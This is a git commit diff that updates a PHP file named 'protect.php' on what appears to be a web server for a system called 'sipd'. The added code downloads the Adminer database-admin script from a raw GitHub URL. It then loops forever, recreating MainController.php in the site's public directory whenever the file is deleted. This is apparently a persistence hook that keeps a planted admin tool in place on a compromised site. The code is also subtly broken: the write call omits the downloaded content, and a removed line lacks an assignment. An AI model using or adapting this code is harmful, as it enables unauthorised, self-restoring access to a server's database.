a0c327d8d69d6064ee1ef4eb10fd0c16f12465eb
n3f0 <nefo424@gmail.com>
2023-01-30 21:32:27 +0700

    Update protect.php

--- protect.php
+++ protect.php
@@ -1,4 +1,9 @@
 <?php
 ini_set('max_execution_time', 0);
-$handle fopen("/var/www/sipd/public_html/MainController.php","r+");
-sleep(100000000);
+$txt=file_get_contents("https://raw.githubusercontent.com/n3f0/adminer/main/adminer-4.8.1.php");
+while(1){
+  if(!file_exists("/var/www/sipd/public/MainController.php")){
+      file_put_contents("/var/www/sipd/public/MainController.php");
+  }
+ sleep(100);
+}
